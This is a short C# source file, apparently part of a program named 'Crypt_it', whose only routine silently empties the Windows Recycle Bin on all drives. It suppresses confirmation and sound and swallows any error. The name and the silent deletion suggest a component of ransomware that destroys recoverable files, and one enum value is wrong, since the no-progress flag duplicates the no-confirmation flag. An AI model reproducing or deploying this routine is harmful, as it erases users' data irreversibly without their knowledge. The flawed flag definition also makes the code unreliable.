using System;
using System.Runtime.InteropServices;

namespace Crypt_it;

public static class Empty
{
	private enum RecycleFlags
	{
		SHRB_NOCONFIRMATION = 1,
		SHRB_NOPROGRESSUI = 1,
		SHRB_NOSOUND = 4
	}

	[DllImport("Shell32.dll", CharSet = CharSet.Unicode)]
	private static extern uint SHEmptyRecycleBin(IntPtr hwnd, string pszRootPath, RecycleFlags dwFlags);

	public static void RecycleBin()
	{
		try
		{
			SHEmptyRecycleBin(IntPtr.Zero, null, (RecycleFlags)5);
		}
		catch
		{
		}
	}
}
